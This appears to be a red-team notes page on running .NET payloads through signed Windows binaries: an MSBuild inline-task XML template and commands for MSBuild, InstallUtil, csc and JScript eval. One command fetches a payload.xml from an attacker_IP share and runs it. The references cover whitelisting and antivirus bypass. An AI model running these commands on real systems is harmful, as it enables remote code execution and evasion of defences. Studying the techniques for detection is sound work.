# DotNET

## 01 - Generate Payloads

### 1.1 - Empire

TODO: Fill this info

UseStager

CSharp payload

MSFVenom

### 1.2 - MSBuild Template

> [!INFO] Valid Extensions
> These are the valid extensions to execute fileless .NET payload. They are: `.csproj`, `.xml`, `.xoml`.
> > [!TIP]
> > You can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload.

XML payload template.

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask {
			// C# Code here
		}
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

## 02 - Execute Payloads

### 2.1 - MSBuild

To execute the .NET payload.

```
C:\> cmd.exe /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\payload.xml > payload.xml & !COMPILER! payload.xml"
```

### 2.2 - InstallUtil

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.exe
```

### 2.3 - CSC

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\payload.cs
```

### 2.4 - JScript

```powershell
[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');
$js = 'var js = new ActiveXObject("WScript.Shell");js.Run("<commands>");'
[Microsoft.JScript.Eval]::JScriptEvaluate($js,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());
```

---
## References

### Backlinks

- [[DLL Execution]]

### Source Repositories

- [khr0x40sh: WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)

### LOLBAS

- [LOLBAS: MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)

- [LOLBAS: InstallUtil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)

- [LOLBAS: CSC](https://lolbas-project.github.io/lolbas/Binaries/Csc/)

- [LOLBAS: Ilasm](https://lolbas-project.github.io/lolbas/Binaries/Ilasm/)

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: InstallUtil](https://www.ired.team/offensive-security/code-execution/t1118-installutil)

- [Red Team Notes: Using MSBuild to Execute Shellcode in C#](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

### Hacking Articles

- [Hacking Articles: Windows Exploitation - MSBuild](https://www.hackingarticles.in/windows-exploitation-msbuild/)

### DMCXBlue

- [DMCXBlue: Compile After Delivery](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t0127-obfuscated-files-or-information/compile-after-delivery)

### Secarma

- [Secarma: Three ways of using MSBuild to beat CrowdStrike](https://secarma.com/three-ways-of-using-msbuild-to-beat-crowdstrike/)

### arno0x0x

- [arno0x0x: Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### Black Hills Information Security

- [Black Hills Information Security: How to Bypass Application Whitelisting & AV](https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/)

### 0xsp

- [0xsp: handy techniques to bypass environment restrictions](https://0xsp.com/offensive/handy-techniques-to-bypass-environment-restrictions/)